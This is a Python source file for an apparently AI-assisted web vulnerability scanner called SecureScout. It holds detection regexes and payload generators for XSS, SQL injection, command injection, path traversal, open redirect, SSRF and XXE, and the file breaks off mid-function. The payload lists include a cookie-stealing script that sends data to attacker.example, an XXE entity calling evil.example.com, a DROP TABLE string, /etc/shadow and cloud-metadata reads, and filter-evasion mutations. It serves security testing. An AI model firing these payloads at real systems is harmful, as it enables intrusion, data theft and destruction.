#!/usr/bin/env python3
# SecureScout - AI-Powered Vulnerability Detection System

import os
import re
import json
import logging
import hashlib
import asyncio
import aiohttp
import numpy as np
from typing import Dict, List, Tuple, Set, Any, Optional, Union
from dataclasses import dataclass, field, asdict
from urllib.parse import urlparse, parse_qs
import difflib
import random
from datetime import datetime
import html

# Configure logging
logger = logging.getLogger("securescout.ai.vulnerability_detector")

@dataclass
class AIDetectionConfig:
    """Configuration for AI-powered vulnerability detection."""
    enabled: bool = True
    confidence_threshold: float = 0.7
    max_attempts_per_vuln_type: int = 5
    max_payloads_per_endpoint: int = 10
    adaptive_learning: bool = True
    use_context_aware_payloads: bool = True
    use_mutation_techniques: bool = True
    sensitivity: str = "medium"  # "low", "medium", "high"
    scan_speed: str = "normal"   # "slow", "normal", "fast"
    api_endpoint: Optional[str] = None
    api_key: Optional[str] = None
    
    # Advanced configuration options
    response_analysis_depth: int = 2
    feature_extraction_enabled: bool = True
    model_version: str = "v2"
    attack_chain_detection: bool = True
    passive_analysis_only: bool = False

@dataclass
class VulnerabilityPattern:
    """Pattern for detecting a specific vulnerability."""
    id: str
    name: str
    type: str
    regex: str
    confidence: float
    severity: str = "medium"
    cwe_id: Optional[str] = None
    description: str = ""
    false_positive_patterns: List[str] = field(default_factory=list)
    
    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary."""
        return asdict(self)

@dataclass
class VulnerabilityResult:
    """Result of a vulnerability detection analysis."""
    id: str
    vulnerability_type: str
    confidence: float
    severity: str
    location: str
    evidence: str
    description: str
    cwe_id: Optional[str] = None
    vector: Optional[str] = None
    parameter: Optional[str] = None
    payload: Optional[str] = None
    request_data: Optional[Dict[str, Any]] = None
    response_data: Optional[Dict[str, Any]] = None
    timestamp: datetime = field(default_factory=datetime.utcnow)
    false_positive_risk: float = 0.0
    attack_chain: List[str] = field(default_factory=list)
    
    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary for serialization."""
        result_dict = asdict(self)
        result_dict['timestamp'] = self.timestamp.isoformat()
        return result_dict

class AIVulnerabilityDetector:
    """
    Advanced AI-powered vulnerability detection system.
    Uses machine learning techniques to detect, verify, and exploit web vulnerabilities.
    """
    
    def __init__(self, scanner, config: AIDetectionConfig = None):
        """
        Initialize the AI vulnerability detector.
        
        Args:
            scanner: Reference to the parent scanner engine
            config: Optional configuration for AI detection
        """
        self.scanner = scanner
        self.config = config or AIDetectionConfig()
        self.session = None
        self.vulnerability_patterns = self._load_vulnerability_patterns()
        self.successful_payloads = {}
        self.failed_payloads = {}
        self.detection_stats = {"true_positives": 0, "false_positives": 0, "total_tests": 0}
        self.base_domain = urlparse(scanner.config.target.url).netloc
        self.embedded_ai = EmbeddedAI()
        self.payload_generators = {
            "xss": self._generate_xss_payloads,
            "sqli": self._generate_sqli_payloads,
            "rce": self._generate_rce_payloads,
            "path_traversal": self._generate_path_traversal_payloads,
            "open_redirect": self._generate_open_redirect_payloads,
            "ssrf": self._generate_ssrf_payloads,
            "xxe": self._generate_xxe_payloads,
        }
        
        # Load vector database from file if exists
        self.vector_db = self._load_vector_database()
    
    async def initialize(self):
        """Initialize the detector, including connections to AI services if needed."""
        # Create HTTP session if needed for external AI service calls
        if self.config.api_endpoint:
            self.session = aiohttp.ClientSession(
                headers={"Authorization": f"Bearer {self.config.api_key}"} if self.config.api_key else {}
            )
        
        # Initialize the embedded AI module
        await self.embedded_ai.initialize()
    
    async def close(self):
        """Close any open resources."""
        if self.session:
            await self.session.close()
        
        # Save learned patterns
        self._save_vector_database()
    
    def _load_vulnerability_patterns(self) -> Dict[str, List[VulnerabilityPattern]]:
        """Load vulnerability detection patterns."""
        patterns = {
            "xss": [
                VulnerabilityPattern(
                    id="xss-001",
                    name="Basic Reflected XSS",
                    type="xss",
                    regex=r"<script>.*?</script>|<img[^>]+onerror=|javascript:",
                    confidence=0.8,
                    severity="high",
                    cwe_id="79",
                    description="Reflected Cross-Site Scripting vulnerability detected.",
                    false_positive_patterns=[
                        r"<pre>.*<script>.*</script>.*</pre>",
                        r"<code>.*<script>.*</script>.*</code>"
                    ]
                ),
                VulnerabilityPattern(
                    id="xss-002",
                    name="DOM-based XSS",
                    type="xss",
                    regex=r"document\.write\([^)]*(?:location\.hash|location\.search)",
                    confidence=0.75,
                    severity="high",
                    cwe_id="79",
                    description="DOM-based Cross-Site Scripting vulnerability detected."
                ),
                VulnerabilityPattern(
                    id="xss-003",
                    name="Event Handler XSS",
                    type="xss",
                    regex=r"on(?:load|error|click|mouseover|focus)=[\"'](?:alert|confirm|prompt)\(",
                    confidence=0.85,
                    severity="high",
                    cwe_id="79",
                    description="Event handler-based Cross-Site Scripting vulnerability detected."
                )
            ],
            "sqli": [
                VulnerabilityPattern(
                    id="sqli-001",
                    name="Error-based SQL Injection",
                    type="sqli",
                    regex=r"SQL syntax.*?MySQL|Warning.*?\Wmysqli?_|MySQLSyntaxErrorException|valid MySQL result|check the manual that corresponds to your (MySQL|MariaDB) server version|MySqlException|PostgreSQL.*?ERROR|pg_query\(\): Query failed:|PG::SyntaxError:|Microsoft SQL Server\s*?[0-9]*?|ORA-[0-9][0-9][0-9][0-9]|Oracle error|SQL error.*?OCIStmtExecute|CLI Driver.*?DB2|DB2 SQL error|SQLSTATE",
                    confidence=0.9,
                    severity="critical",
                    cwe_id="89",
                    description="Error-based SQL Injection vulnerability detected."
                ),
                VulnerabilityPattern(
                    id="sqli-002",
                    name="Blind SQL Injection",
                    type="sqli",
                    regex=r"",  # Blind SQLi detection is pattern-less, uses timing or boolean techniques
                    confidence=0.7,
                    severity="critical",
                    cwe_id="89",
                    description="Blind SQL Injection vulnerability detected based on response time differences."
                )
            ],
            "rce": [
                VulnerabilityPattern(
                    id="rce-001",
                    name="Command Injection",
                    type="rce",
                    regex=r"sh: [0-9]+: .*?: not found|^uid=[0-9]+\(.+\) gid=[0-9]+\(.+\)|Directory of|Volume Serial Number|\\d+:\\d+:[ap]m|\[[a-zA-Z0-9_]+\\]\\$",
                    confidence=0.95,
                    severity="critical",
                    cwe_id="77",
                    description="Remote Command Execution vulnerability detected."
                )
            ],
            "path_traversal": [
                VulnerabilityPattern(
                    id="pt-001",
                    name="Path Traversal",
                    type="path_traversal",
                    regex=r"root:.*:0:0:|\\[boot\\]|etc\\passwd|\\etc\\shadow|\\etc\\hosts|\\etc\\issue|\\proc\\self\\environ|\\usr\\local\\",
                    confidence=0.85,
                    severity="high",
                    cwe_id="22",
                    description="Path Traversal vulnerability detected."
                )
            ],
            "open_redirect": [
                VulnerabilityPattern(
                    id="or-001",
                    name="Open Redirect",
                    type="open_redirect",
                    regex=r"", # Special case, handled in specific methods
                    confidence=0.8,
                    severity="medium",
                    cwe_id="601",
                    description="Open Redirect vulnerability detected."
                )
            ],
            "ssrf": [
                VulnerabilityPattern(
                    id="ssrf-001",
                    name="Server-Side Request Forgery",
                    type="ssrf",
                    regex=r"Private\s*network|HTTP/[0-9.]+ 200|AWS_SECRET_KEY|169\.254\.|127\.0\.0\.|10\.[0-9]+\.[0-9]+\.[0-9]+",
                    confidence=0.8,
                    severity="high",
                    cwe_id="918",
                    description="Server-Side Request Forgery vulnerability detected."
                )
            ],
            "xxe": [
                VulnerabilityPattern(
                    id="xxe-001",
                    name="XML External Entity Injection",
                    type="xxe",
                    regex=r"root:.*:0:0:|\\[boot\\]|etc\\passwd|\\etc\\shadow",
                    confidence=0.9,
                    severity="critical",
                    cwe_id="611",
                    description="XML External Entity Injection vulnerability detected."
                )
            ]
        }
        return patterns
    
    def _load_vector_database(self) -> Dict[str, Any]:
        """Load vector database of vulnerability patterns from disk."""
        vector_db_path = os.path.join(os.path.dirname(__file__), "data", "vector_db.json")
        try:
            if os.path.exists(vector_db_path):
                with open(vector_db_path, 'r') as f:
                    return json.load(f)
        except Exception as e:
            logger.error(f"Error loading vector database: {e}")
        
        # Return default structure if loading fails
        return {
            "vectors": {},
            "learned_patterns": {},
            "false_positives": {},
            "success_payloads": {}
        }
    
    def _save_vector_database(self):
        """Save learned patterns to disk."""
        vector_db_path = os.path.join(os.path.dirname(__file__), "data", "vector_db.json")
        try:
            # Create directory if it doesn't exist
            os.makedirs(os.path.dirname(vector_db_path), exist_ok=True)
            
            # Add successful payloads to database
            self.vector_db["success_payloads"].update(self.successful_payloads)
            
            # Write to file
            with open(vector_db_path, 'w') as f:
                json.dump(self.vector_db, f, indent=2)
        except Exception as e:
            logger.error(f"Error saving vector database: {e}")
    
    async def analyze_response(self, url: str, response: Any, 
                               response_data: Any, payload: str = None, 
                               vulnerability_type: str = None) -> List[VulnerabilityResult]:
        """
        Analyze a response for potential vulnerabilities.
        
        Args:
            url: The URL that was tested
            response: The HTTP response object
            response_data: The response content
            payload: Optional payload that was used in the request
            vulnerability_type: Optional specific vulnerability type to check
            
        Returns:
            List of detected vulnerabilities
        """
        if self.config.passive_analysis_only and payload:
            # Skip active testing in passive mode
            return []
        
        results = []
        
        # For text responses, we can check patterns
        if isinstance(response_data, str):
            if vulnerability_type:
                # Check only the specified vulnerability type
                patterns = self.vulnerability_patterns.get(vulnerability_type, [])
                results.extend(await self._check_patterns(url, response_data, patterns, payload))
            else:
                # Check all vulnerability types
                for vuln_type, patterns in self.vulnerability_patterns.items():
                    results.extend(await self._check_patterns(url, response_data, patterns, payload))
        
        # For redirects, check open redirect vulnerabilities
        if response and 300 <= response.status < 400 and 'location' in response.headers:
            location = response.headers['location']
            redirect_result = await self._check_open_redirect(url, location, payload)
            if redirect_result:
                results.append(redirect_result)
        
        # Check for timing-based vulnerabilities (e.g., blind SQL injection)
        if payload and hasattr(response, 'elapsed'):
            timing_result = await self._check_timing_attack(url, response.elapsed.total_seconds(), payload)
            if timing_result:
                results.append(timing_result)
        
        # Apply confidence filtering
        results = [r for r in results if r.confidence >= self.config.confidence_threshold]
        
        # Apply false positive filtering
        results = await self._filter_false_positives(results, response_data)
        
        # If we're using the external AI service, verify with it
        if self.config.api_endpoint and self.session:
            results = await self._verify_with_external_ai(results, url, response_data, payload)
        
        # Use embedded AI to analyze results
        if self.embedded_ai.is_initialized() and results:
            results = await self.embedded_ai.analyze_vulnerabilities(results, url, response_data, payload)
        
        # Update statistics
        self.detection_stats["total_tests"] += 1
        if results:
            self.detection_stats["true_positives"] += 1
            
            # Store successful payloads for future learning
            if payload:
                vuln_types = set(r.vulnerability_type for r in results)
                for vt in vuln_types:
                    if vt not in self.successful_payloads:
                        self.successful_payloads[vt] = []
                    if payload not in self.successful_payloads[vt]:
                        self.successful_payloads[vt].append(payload)
        
        return results
    
    async def _check_patterns(self, url: str, response_data: str, 
                              patterns: List[VulnerabilityPattern], 
                              payload: str = None) -> List[VulnerabilityResult]:
        """
        Check response data against vulnerability patterns.
        
        Args:
            url: The URL that was tested
            response_data: The response content as string
            patterns: List of vulnerability patterns to check
            payload: Optional payload that was used in the request
            
        Returns:
            List of detected vulnerabilities
        """
        results = []
        
        for pattern in patterns:
            # Skip empty regex patterns (special cases like blind SQLi)
            if not pattern.regex:
                continue
                
            regex = re.compile(pattern.regex, re.IGNORECASE)
            matches = regex.finditer(response_data)
            
            for match in matches:
                # Extract matched evidence
                evidence = match.group(0)
                
                # Check if the evidence is in a code/pre block (common false positive)
                false_positive = False
                for fp_pattern in pattern.false_positive_patterns:
                    if re.search(fp_pattern, response_data, re.IGNORECASE | re.DOTALL):
                        false_positive = True
                        break
                
                if false_positive:
                    continue
                
                # If we found a match, create a vulnerability result
                result_id = hashlib.md5(f"{url}:{pattern.id}:{evidence}".encode()).hexdigest()
                
                # Adjust confidence based on payload presence
                confidence = pattern.confidence
                if payload and payload in evidence:
                    # Higher confidence if our payload is in the evidence
                    confidence = min(confidence + 0.1, 1.0)
                elif payload and payload not in response_data:
                    # Lower confidence if our payload isn't in the response at all
                    confidence = max(confidence - 0.1, 0.0)
                
                # Extract parameter from URL if available
                parameter = None
                if '?' in url:
                    query_params = parse_qs(urlparse(url).query)
                    for param, values in query_params.items():
                        for value in values:
                            if payload and value == payload:
                                parameter = param
                                break
                
                # Create the vulnerability result
                vuln_result = VulnerabilityResult(
                    id=result_id,
                    vulnerability_type=pattern.type,
                    confidence=confidence,
                    severity=pattern.severity,
                    location=url,
                    evidence=evidence,
                    description=pattern.description,
                    cwe_id=pattern.cwe_id,
                    parameter=parameter,
                    payload=payload
                )
                
                results.append(vuln_result)
        
        return results
    
    async def _check_open_redirect(self, url: str, location: str, 
                                   payload: str = None) -> Optional[VulnerabilityResult]:
        """
        Check for open redirect vulnerabilities.
        
        Args:
            url: The URL that was tested
            location: The redirect location
            payload: Optional payload that was used in the request
            
        Returns:
            Vulnerability result if detected, None otherwise
        """
        if not payload or not location:
            return None
        
        # Check if the redirect goes to a different domain
        parsed_url = urlparse(url)
        original_domain = parsed_url.netloc
        
        parsed_location = urlparse(location)
        redirect_domain = parsed_location.netloc
        
        # If we're redirecting to a different domain and our payload is in the location
        if (redirect_domain and original_domain != redirect_domain and
            (payload in location or 
             # Also check for encoded versions
             payload.replace(":", "%3A") in location or
             payload.replace("/", "%2F") in location)):
            
            # Calculate confidence based on similarity to the payload
            confidence = 0.8  # Base confidence
            if payload in location:
                confidence = 0.9
            
            result_id = hashlib.md5(f"{url}:open_redirect:{location}".encode()).hexdigest()
            
            return VulnerabilityResult(
                id=result_id,
                vulnerability_type="open_redirect",
                confidence=confidence,
                severity="medium",
                location=url,
                evidence=f"Redirected to: {location}",
                description="Open Redirect vulnerability detected. The application redirects to user-controlled domains.",
                cwe_id="601",
                parameter=parsed_url.query.split('=')[0] if '=' in parsed_url.query else None,
                payload=payload
            )
        
        return None
    
    async def _check_timing_attack(self, url: str, response_time: float, 
                                   payload: str = None) -> Optional[VulnerabilityResult]:
        """
        Check for timing-based vulnerabilities.
        
        Args:
            url: The URL that was tested
            response_time: Response time in seconds
            payload: Payload that was used in the request
            
        Returns:
            Vulnerability result if detected, None otherwise
        """
        if not payload or "sleep" not in payload.lower():
            return None
        
        # Extract the sleep time from the payload
        sleep_match = re.search(r'sleep\s*\(\s*(\d+)\s*\)', payload, re.IGNORECASE)
        if not sleep_match:
            return None
        
        try:
            sleep_time = int(sleep_match.group(1))
            
            # If response time is close to the sleep time, it's likely a blind injection
            if response_time >= sleep_time * 0.8:
                confidence = min(0.7 + (response_time / sleep_time) * 0.2, 0.95)
                
                result_id = hashlib.md5(f"{url}:blind_sqli:{payload}".encode()).hexdigest()
                
                return VulnerabilityResult(
                    id=result_id,
                    vulnerability_type="sqli",
                    confidence=confidence,
                    severity="critical",
                    location=url,
                    evidence=f"Response time: {response_time}s with payload containing sleep({sleep_time})",
                    description="Blind SQL Injection vulnerability detected based on time delay.",
                    cwe_id="89",
                    parameter=urlparse(url).query.split('=')[0] if '=' in urlparse(url).query else None,
                    payload=payload
                )
        except (ValueError, AttributeError):
            pass
        
        return None
    
    async def _filter_false_positives(self, results: List[VulnerabilityResult], 
                                      response_data: str) -> List[VulnerabilityResult]:
        """
        Filter out likely false positives.
        
        Args:
            results: List of detected vulnerabilities
            response_data: Response content
            
        Returns:
            Filtered list of vulnerabilities
        """
        filtered_results = []
        
        for result in results:
            # Skip if evidence appears in a code block
            if isinstance(response_data, str):
                evidence_escaped = re.escape(result.evidence)
                if re.search(f"<(pre|code)[^>]*>.*{evidence_escaped}.*</(pre|code)>", 
                            response_data, re.IGNORECASE | re.DOTALL):
                    logger.debug(f"Filtering out false positive (in code block): {result.id}")
                    continue
            
            # Calculate false positive risk
            if isinstance(response_data, str):
                # Check if the evidence appears multiple times
                evidence_count = response_data.count(result.evidence)
                if evidence_count > 3:
                    # If the same evidence appears many times, it's more likely to be a false positive
                    result.false_positive_risk = min(0.1 * evidence_count, 0.9)
                
                # Check if this is a stored response (e.g., from a database)
                # which might contain legitimate script tags or SQL commands
                if '<script>' in response_data and '</script>' in response_data:
                    if result.vulnerability_type == 'xss' and ('<script>' in result.evidence or '</script>' in result.evidence):
                        result.false_positive_risk = max(result.false_positive_risk, 0.7)
            
            # Only keep results where the confidence outweighs the false positive risk
            if result.confidence > result.false_positive_risk + 0.2:
                filtered_results.append(result)
        
        return filtered_results
    
    async def _verify_with_external_ai(self, results: List[VulnerabilityResult], 
                                      url: str, response_data: str, 
                                      payload: str = None) -> List[VulnerabilityResult]:
        """
        Verify results with an external AI service.
        
        Args:
            results: List of detected vulnerabilities
            url: URL that was tested
            response_data: Response content
            payload: Optional payload that was used
            
        Returns:
            Verified list of vulnerabilities
        """
        if not self.config.api_endpoint or not self.session or not results:
            return results
        
        try:
            # Prepare the request data
            request_data = {
                "results": [r.to_dict() for r in results],
                "url": url,
                "response": response_data[:5000],  # Limit response size
                "payload": payload
            }
            
            # Make the API call
            async with self.session.post(self.config.api_endpoint, json=request_data) as response:
                if response.status == 200:
                    data = await response.json()
                    verified_results = []
                    
                    for result_data in data.get("verified_results", []):
                        # Convert back to VulnerabilityResult objects
                        try:
                            result_id = result_data.get("id", "")
                            # Find the matching result
                            for result in results:
                                if result.id == result_id:
                                    # Update the confidence
                                    result.confidence = result_data.get("confidence", result.confidence)
                                    # Only include if confidence is still above threshold
                                    if result.confidence >= self.config.confidence_threshold:
                                        verified_results.append(result)
                                    break
                        except Exception as e:
                            logger.error(f"Error processing verified result: {e}")
                    
                    return verified_results
        except Exception as e:
            logger.error(f"Error verifying with external AI: {e}")
        
        # Return original results if verification failed
        return results
    
    async def generate_payloads(self, vulnerability_type: str, context: Dict[str, Any] = None) -> List[str]:
        """
        Generate context-aware payloads for a specific vulnerability type.
        
        Args:
            vulnerability_type: Type of vulnerability to generate payloads for
            context: Optional context information to guide payload generation
            
        Returns:
            List of payloads
        """
        if vulnerability_type not in self.payload_generators:
            return []
        
        # Call the appropriate payload generator
        generator = self.payload_generators[vulnerability_type]
        return await generator(context)
    
    async def _generate_xss_payloads(self, context: Dict[str, Any] = None) -> List[str]:
        """Generate XSS payloads."""
        context = context or {}
        payloads = []
        
        # Check for any successful payloads we've learned
        if "xss" in self.successful_payloads:
            payloads.extend(self.successful_payloads["xss"][:3])  # Use up to 3 learned payloads
        
        # Base payloads
        base_payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            "javascript:alert(1)",
            "\"><script>alert(1)</script>",
            "\"><img src=x onerror=alert(1)>",
            "<script>fetch('https://attacker.example/'+document.cookie)</script>"
        ]
        
        # Add base payloads
        payloads.extend(base_payloads)
        
        # Context-aware payloads
        if context.get("in_attribute"):
            attr_payloads = [
                "\" onmouseover=\"alert(1)",
                "\" onfocus=\"alert(1)",
                "\" onclick=\"alert(1)",
                "\" onerror=\"alert(1)",
                "\"onload=\"alert(1)"
            ]
            payloads.extend(attr_payloads)
        
        if context.get("in_script"):
            script_payloads = [
                "\";alert(1);//",
                "\';alert(1);//",
                "\\';alert(1);//",
                "\\";alert(1);//"
            ]
            payloads.extend(script_payloads)
        
        if context.get("in_path"):
            path_payloads = [
                "</script><script>alert(1)</script>",
                "<script>alert(1)</script>/"
            ]
            payloads.extend(path_payloads)
        
        # Add mutation techniques if enabled
        if self.config.use_mutation_techniques:
            # Create mutations of base payloads
            mutations = []
            for payload in base_payloads[:3]:  # Only mutate the first few base payloads
                mutations.extend(self._mutate_payload(payload))
            payloads.extend(mutations)
        
        # Deduplicate and limit
        payloads = list(dict.fromkeys(payloads))
        return payloads[:self.config.max_payloads_per_endpoint]
    
    async def _generate_sqli_payloads(self, context: Dict[str, Any] = None) -> List[str]:
        """Generate SQL injection payloads."""
        context = context or {}
        payloads = []
        
        # Check for any successful payloads we've learned
        if "sqli" in self.successful_payloads:
            payloads.extend(self.successful_payloads["sqli"][:3])  # Use up to 3 learned payloads
        
        # Basic SQLi payloads
        base_payloads = [
            "' OR '1'='1",
            "\" OR \"1\"=\"1",
            "1 OR 1=1",
            "' OR 1=1 -- ",
            "\" OR 1=1 -- ",
            "' OR '1'='1' -- ",
            "admin' -- ",
            "1'; DROP TABLE users; --",
            "1' AND (SELECT 1 FROM (SELECT COUNT(*),concat(0x3a,(SELECT database()),0x3a,floor(rand()*2))a FROM information_schema.tables GROUP BY a)b) -- x"
        ]
        payloads.extend(base_payloads)
        
        # Blind SQLi payloads
        if context.get("test_blind", True):
            blind_payloads = [
                "' AND SLEEP(5) -- ",
                "\" AND SLEEP(5) -- ",
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) -- ",
                "' AND IF(1=1, SLEEP(5), 0) -- ",
                "1 AND SLEEP(5)"
            ]
            payloads.extend(blind_payloads)
        
        # Context-specific payloads
        if context.get("dbms") == "mysql":
            mysql_payloads = [
                "' AND extractvalue(1, concat(0x7e, (SELECT database()))) -- ",
                "' AND updatexml(1, concat(0x7e, (SELECT database())), 1) -- "
            ]
            payloads.extend(mysql_payloads)
        
        elif context.get("dbms") == "postgresql":
            postgres_payloads = [
                "' AND (SELECT pg_sleep(5)) -- ",
                "'; SELECT pg_sleep(5) -- "
            ]
            payloads.extend(postgres_payloads)
        
        elif context.get("dbms") == "mssql":
            mssql_payloads = [
                "'; WAITFOR DELAY '00:00:05' -- ",
                "'; IF 1=1 WAITFOR DELAY '00:00:05' -- "
            ]
            payloads.extend(mssql_payloads)
        
        # Add mutation techniques if enabled
        if self.config.use_mutation_techniques:
            # Create mutations of base payloads
            mutations = []
            for payload in base_payloads[:3]:  # Only mutate the first few payloads
                mutations.extend(self._mutate_payload(payload))
            payloads.extend(mutations)
        
        # Deduplicate and limit
        payloads = list(dict.fromkeys(payloads))
        return payloads[:self.config.max_payloads_per_endpoint]
    
    async def _generate_rce_payloads(self, context: Dict[str, Any] = None) -> List[str]:
        """Generate remote code execution payloads."""
        context = context or {}
        payloads = []
        
        # Check for any successful payloads we've learned
        if "rce" in self.successful_payloads:
            payloads.extend(self.successful_payloads["rce"][:3])
        
        # Basic RCE payloads
        base_payloads = [
            "; id",
            "& id",
            "| id",
            "`id`",
            "$(id)",
            "; cat /etc/passwd",
            "& ping -c 3 127.0.0.1",
            "| ping -c 3 127.0.0.1",
            "; sleep 5",
            "& sleep 5",
            "| sleep 5"
        ]
        payloads.extend(base_payloads)
        
        # Windows-specific payloads
        if context.get("os") == "windows":
            windows_payloads = [
                "; dir",
                "& dir",
                "| dir",
                "; ping -n 5 127.0.0.1",
                "& ping -n 5 127.0.0.1",
                "| ping -n 5 127.0.0.1",
                "& timeout 5",
                "; timeout 5"
            ]
            payloads.extend(windows_payloads)
        
        # PHP-specific payloads
        if context.get("language") == "php":
            php_payloads = [
                "';system('id');'",
                "\";system('id');\"",
                "<?php system('id'); ?>",
                "<?php phpinfo(); ?>"
            ]
            payloads.extend(php_payloads)
        
        # Python-specific payloads
        if context.get("language") == "python":
            python_payloads = [
                "'; import os; os.system('id'); '",
                "\"; import os; os.system('id'); \"",
                "__import__('os').system('id')"
            ]
            payloads.extend(python_payloads)
        
        # Add mutation techniques if enabled
        if self.config.use_mutation_techniques:
            mutations = []
            for payload in base_payloads[:3]:
                mutations.extend(self._mutate_payload(payload))
            payloads.extend(mutations)
        
        # Deduplicate and limit
        payloads = list(dict.fromkeys(payloads))
        return payloads[:self.config.max_payloads_per_endpoint]
    
    async def _generate_path_traversal_payloads(self, context: Dict[str, Any] = None) -> List[str]:
        """Generate path traversal payloads."""
        context = context or {}
        payloads = []
        
        # Check for any successful payloads we've learned
        if "path_traversal" in self.successful_payloads:
            payloads.extend(self.successful_payloads["path_traversal"][:3])
        
        # Basic path traversal payloads
        base_payloads = [
            "../../../etc/passwd",
            "../../../../etc/passwd",
            "../../../../../etc/passwd",
            "../../../../../../etc/passwd",
            "../../../etc/shadow",
            "../../../proc/self/environ",
            "../../../var/log/apache2/access.log",
            "../../../../../../../../../../../../etc/passwd"
        ]
        payloads.extend(base_payloads)
        
        # URL-encoded variants
        encoded_payloads = [
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"
        ]
        payloads.extend(encoded_payloads)
        
        # Windows-specific payloads
        if context.get("os") == "windows":
            windows_payloads = [
                "..\\..\\..\\Windows\\win.ini",
                "..\\..\\..\\boot.ini",
                "..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",
                "C:\\Windows\\win.ini",
                "\\..\\..\\..\\Windows\\win.ini"
            ]
            payloads.extend(windows_payloads)
        
        # Add mutation techniques if enabled
        if self.config.use_mutation_techniques:
            mutations = []
            for payload in base_payloads[:3]:
                mutations.extend(self._mutate_payload(payload))
            payloads.extend(mutations)
        
        # Deduplicate and limit
        payloads = list(dict.fromkeys(payloads))
        return payloads[:self.config.max_payloads_per_endpoint]
    
    async def _generate_open_redirect_payloads(self, context: Dict[str, Any] = None) -> List[str]:
        """Generate open redirect payloads."""
        context = context or {}
        payloads = []
        
        # Check for any successful payloads we've learned
        if "open_redirect" in self.successful_payloads:
            payloads.extend(self.successful_payloads["open_redirect"][:3])
        
        # Generate attacker domain
        attacker_domain = context.get("attacker_domain", "evil.example.com")
        
        # Basic open redirect payloads
        base_payloads = [
            f"https://{attacker_domain}",
            f"http://{attacker_domain}",
            f"//{attacker_domain}",
            f"javascript:window.location='{attacker_domain}'",
            f"https://{attacker_domain}/?q=",
            f"https://{self.base_domain}.{attacker_domain}"
        ]
        payloads.extend(base_payloads)
        
        # Encoded variants
        encoded_payloads = [
            f"https%3A%2F%2F{attacker_domain}",
            f"%2F%2F{attacker_domain}"
        ]
        payloads.extend(encoded_payloads)
        
        # Add mutation techniques if enabled
        if self.config.use_mutation_techniques:
            mutations = []
            for payload in base_payloads[:3]:
                mutations.extend(self._mutate_payload(payload))
            payloads.extend(mutations)
        
        # Deduplicate and limit
        payloads = list(dict.fromkeys(payloads))
        return payloads[:self.config.max_payloads_per_endpoint]
    
    async def _generate_ssrf_payloads(self, context: Dict[str, Any] = None) -> List[str]:
        """Generate SSRF payloads."""
        context = context or {}
        payloads = []
        
        # Check for any successful payloads we've learned
        if "ssrf" in self.successful_payloads:
            payloads.extend(self.successful_payloads["ssrf"][:3])
        
        # Basic SSRF payloads
        base_payloads = [
            "http://127.0.0.1",
            "http://localhost",
            "http://127.0.0.1:22",
            "http://127.0.0.1:3306",
            "http://169.254.169.254/latest/meta-data/",  # AWS metadata
            "http://metadata.google.internal/",  # GCP metadata
            "http://169.254.169.254/metadata/v1/",  # DigitalOcean metadata
            "file:///etc/passwd",
            "file:///proc/self/environ",
            "dict://localhost:11211/stat"  # Memcached
        ]
        payloads.extend(base_payloads)
        
        # Add mutation techniques if enabled
        if self.config.use_mutation_techniques:
            mutations = []
            for payload in base_payloads[:3]:
                mutations.extend(self._mutate_payload(payload))
            payloads.extend(mutations)
        
        # Deduplicate and limit
        payloads = list(dict.fromkeys(payloads))
        return payloads[:self.config.max_payloads_per_endpoint]
    
    async def _generate_xxe_payloads(self, context: Dict[str, Any] = None) -> List[str]:
        """Generate XXE payloads."""
        context = context or {}
        payloads = []
        
        # Check for any successful payloads we've learned
        if "xxe" in self.successful_payloads:
            payloads.extend(self.successful_payloads["xxe"][:3])
        
        # Basic XXE payloads
        base_payloads = [
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>',
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/shadow" >]><foo>&xxe;</foo>',
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://127.0.0.1:22" >]><foo>&xxe;</foo>',
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "https://evil.example.com/collect?data=DEBUG" >]><foo>&xxe;</foo>'
        ]
        payloads.extend(base_payloads)
        
        # Deduplicate and limit
        payloads = list(dict.fromkeys(payloads))
        return payloads[:self.config.max_payloads_per_endpoint]
    
    def _mutate_payload(self, payload: str) -> List[str]:
        """
        Create mutations of a payload to bypass filters.
        
        Args:
            payload: The original payload
            
        Returns:
            List of mutated payloads
        """
        mutations = []
        
        # Case mutations
        if not payload.startswith('<?xml'):  # Skip for XML payloads
            mutations.append(payload.upper())
            mutations.append(payload.title())
        
        # Encoding mutations
        if '<' in payload and '>' in payload:
            # HTML entity encoding
            encoded = payload.replace('<', '&lt;').replace('>', '&gt;')
            mutations.append(encoded)
        
        # URL-encode special characters
        url_encoded = payload
        for char, encoded in [('/', '%2F'), ('<', '%3C'), ('>', '%3E'), ('"', '%22'), ("'", '%27'), (' ', '%20')]:
            if char in url_encoded:
                mutations.append(url_encoded.replace(char, encoded))
                # Only encode one character at a time to keep payloads recognizable
                url_encoded = payload
        
        # For SQL injections, add comments
        if "'" in payload or '"' in payload:
            mutations.append(payload + " -- ")
            mutations.append(payload + "/**/")
        
        # For XSS payloads, add obfuscation
        if "<script>" in payload:
            mutations.append(payload.replace("<script>", "<scr<script>ipt>"))
            mutations.append(payload.replace("<script>", "<script/x>"))
        
        return mutations
    
    async def test_endpoint(self, url: str, method: str = 'GET', 
                          parameters: Dict[str, str] = None, 
                          vulnerability_types: List[str] = None,
                          data: Dict[str, Any] = None,
                          json_data: Dict[str, Any] = None,
                          cookies: Dict[str, str] = None,
                          headers: Dict[str, str] = None) -> List[VulnerabilityResult]:
        """
        Test an endpoint for vulnerabilities by sending malicious payloads.
        
        Args:
            url: URL to test
            method: HTTP method to use
            parameters: Dictionary of parameters to test (name -> value)
            vulnerability_types: List of vulnerability types to test, or None for all
            data: Form data to include
            json_data: JSON data to include
            cookies: Cookies to include
            headers: Headers to include
            
